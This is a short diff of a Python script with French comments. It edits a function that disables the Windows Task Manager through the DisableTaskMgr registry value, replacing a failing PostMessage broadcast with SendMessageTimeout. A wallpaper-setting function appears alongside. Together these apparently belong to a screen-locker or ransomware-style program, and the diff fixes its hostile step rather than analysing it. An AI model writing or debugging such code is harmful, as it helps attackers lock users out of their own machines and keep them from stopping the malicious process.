@@ -136,10 +136,18 @@ def disable_task_manager():
             key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
         winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
         winreg.CloseKey(key)
-        win32gui.PostMessage(win32con.HWND_BROADCAST, win32con.WM_SETTINGCHANGE, 0, 0)
+
+        # Remplacer PostMessage par SendMessageTimeout pour éviter l'erreur
+        win32gui.SendMessageTimeout(
+            win32con.HWND_BROADCAST,
+            win32con.WM_SETTINGCHANGE,
+            0,
+            0,
+            win32con.SMTO_ABORTIFHUNG,
+            5000
+        )
     except Exception as e:
         print(f"Erreur lors de la désactivation du gestionnaire des tâches : {e}")
-
 def set_wallpaper(image_path):
     try:
         full_path = os.path.abspath(image_path)
